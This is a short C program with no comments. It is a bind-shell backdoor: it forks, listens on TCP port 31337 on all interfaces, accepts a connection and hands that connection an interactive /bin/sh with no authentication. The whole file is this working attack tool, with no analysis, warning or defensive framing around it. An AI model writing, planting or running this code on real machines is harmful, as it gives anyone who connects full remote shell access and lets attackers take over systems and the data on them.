#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

int soc, cli;
int sins;
struct sockaddr_in serv_addr;
struct sockaddr_in cli_addr;

int main()
{
  int n_reuse = 200;
  sins = 0x10;
  if(fork() == 0)
  {
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(31337);
    soc = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(soc, SOL_SOCKET, SO_REUSEADDR, (char*)&n_reuse, sizeof(n_reuse));
    bind(soc, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    listen(soc, 1);
    cli = accept(soc, (struct sockaddr *)&cli_addr, &sins);
    dup2(cli, 0);
    dup2(cli, 1);
    dup2(cli, 2);
    execl("/bin/sh", "sh", 0);
    close(cli);
    exit(0);
  }
}
